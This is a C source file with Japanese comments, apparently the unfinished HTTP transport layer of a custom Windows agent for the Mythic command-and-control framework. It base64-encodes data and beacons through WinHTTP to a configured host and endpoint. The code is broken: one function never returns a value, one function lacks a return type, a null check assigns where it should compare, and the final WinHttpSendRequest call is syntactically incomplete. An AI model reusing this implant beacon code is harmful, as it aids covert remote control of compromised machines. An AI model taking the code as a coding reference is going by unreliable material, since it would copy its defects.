// トランスポート層のhttp通信を担当
#include <windows.h>
#include "package.h"
#include "../include/parser.h"

#include "../include/transport.h"

// sendPackage関数のwinhttpへの依存
#include <winhttp.h> // winhttpはワイド文字(unicode)のみサポートしているので注意が必要
#pragma comment (lib, "winhttp.lib")

// 抽象化レイヤー、どの通信にするのか選べる
PParser sendAndRecive(PBYTE data, SIZE_T size)
{
    #ifdef HTTP_TRANSPORT
        return makeHTTPRequest(data, size);
    #endif
    // ここにほかの通信プロトコルを配置することで動作する。

    //return nullptr;
}

// http通信 Mythicはbase64を期待しているためbase64で送る関数
PParser convertBase64(PPackage package)
{
    //convert base64
    // TODO:後で自分で実装した関数に置き換える　crypt32.dllへの依存が増えるため
    DWORD needBytes = 0;
    
    // 返される文字列を保持する単に割り当てる必要がある文字列を計算する。
    CryptBinaryToStringA(
        (const BYTE*)package->buffer,
        (DWORD)package->length,
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
        NULL,
        &needBytes
    );
    // メモリの確保
    LPSTR outBuf = (LPSTR)LocalAlloc(
        LPTR,
        needBytes
    );

    CryptBinaryToStringA(
        (const BYTE*)package->buffer,
        (DWORD)package->length,
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
        outBuf,
        &needBytes
    );
}

// win32api
sendPackage (void)
{
    //WinHttpOpen
    HINTERNET hSession;

    //WinHttpConnect
    HINTERNET hConnect;

    //WinHttpOpenRequest
    HINTERNET hRequest;


    hSession = WinHttpOpen(
        L"UserAgent/1.0",
        WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    //errorhandling
    if (hSession == NULL)
    {
        return -1;
    }

    hConnect = WinHttpConnect(
        hSession,
        corn_config.HostName,
        corn_config.HttpPort,
        0
    );

    if (hConnect == NULL)
    {
        return -1;
    }

    hRequest = WinHttpOpenRequest(
        hConnect,
        corn_config.HttpMethod,
        corn_config.EndPoint,
        NULL,
        WINHTTP_NO_REFERER, //referer headerどこからきた通信なのか
        WINHTTP_DEFAULT_ACCEPT_TYPES, //accept header
        0 //httpsを使うか後で確認する
    );

    if (hRequest = NULL){
        return -1;
    }

    BOOL request_result = WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,

    );



}